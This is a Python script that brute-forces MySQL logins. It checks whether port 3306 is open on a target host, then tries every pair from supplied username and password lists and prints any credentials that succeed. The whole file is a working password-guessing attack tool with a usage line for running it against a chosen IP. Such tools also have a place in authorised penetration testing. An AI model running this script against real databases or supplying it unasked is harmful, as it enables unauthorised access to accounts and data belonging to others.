#!/usr/bin/python3
''' mysql bruteforce script.

A script for bruteforcing check_for_mysql

Test with the following commandline
python3 mysql_brute.py 192.168.2.5  users.txt passwords.txt
'''

import mysql.connector
from mysql.connector import errorcode
import sys
import socket
from func_timeout import func_timeout, FunctionTimedOut


def execute_scan(host, userfile, passwordfile, port, connect_timeout, ssl):
    '''Execute the bruteforce scan
    :param str host: hosts (IP addresses, hostnames) comma separated
    :param str userfile: filename with usernames
    :param str passwordfile: filename with passwords
    :param int port : port number
    :param bool ssl: bool to set ssl
    :param bool use_subset: bool for subset of lists and slow connection
    '''

    # connect_timeout = 2
    # read_timeout = 2

    try:  # exceptions with files
        # open the Userfile in users list
        users = []
        with open(userfile) as file:
            for line in file:
                users.append(line.strip())

        passwords = []
        with open(passwordfile) as file:
            for line in file:
                passwords.append(line.strip())
    except Exception as FileError:
        print(FileError)

    # start actual brute forcing
    for user in users:
        for password in passwords:
            try:
                value = func_timeout(1, login_mysql, args=(host, user, password, port, connect_timeout, ssl))
                # login_mysql(host, user, password, port, connect_timeout, ssl)
            except FunctionTimedOut:
                print('time out')


def check_mysql(host, port, connect_timeout):
    """Function for checking if there is mysql database running."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(connect_timeout)
    # Check if the port is listening on the host.
    print(host)
    print(port)
    if sock.connect_ex((host, port)) == 0:
        print(f'Mysql server found on {host}, with {port}')
        return True
    else:
        print(f'No mysql server found on {host}, with {port}')
        return False
    sock.close()


def login_mysql(host, user, password, port, connect_timeout, ssl):
    """Function for logging in to mysql."""
    not_ssl = not ssl
    try:
        conn = mysql.connector.connect(
            host=host,
            user=user,
            passwd=password,
            port=port,
            connection_timeout=connect_timeout,
            ssl_disabled=False,  # dummy for ssl
            # auth_plugin='mysql_native_password'
            )
        if conn.is_connected():
            # User credentials found
            print(f'Credentials found: {user}:{password} on {host}')
            conn.close()
            return True
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            # wrong credentials, continue with script
            pass
        elif err.errno == errorcode.ER_CON_COUNT_ERROR:
            print('To many connections!!')
        elif err.errno == errorcode.ER_SERVER_ISNT_AVAILABLE:
            print('server is not available!!')
        elif err.errno == 2013:
            print('lost connection!!')
        elif err.errno == 2003:
            print('Can not connect to database!!')
        else:
            print('Unknown error')
            print(err)
            return False


if len(sys.argv) != 4:
    print("Not enough arguments:\n" +
          'Usage: mysql_brute.py target userfile passfile')
else:
    host = sys.argv[1]
    users = sys.argv[2]
    passw = sys.argv[3]
    ssl = False
    if check_mysql(host, 3306, 5):
        print('Mysql available continue with bruteforcing')
        execute_scan(host, users, passw, 3306, 1, ssl)
    else:
        print('No mysql server available')
    # execute_scan(host, users, passw, 3306, 1, ssl)
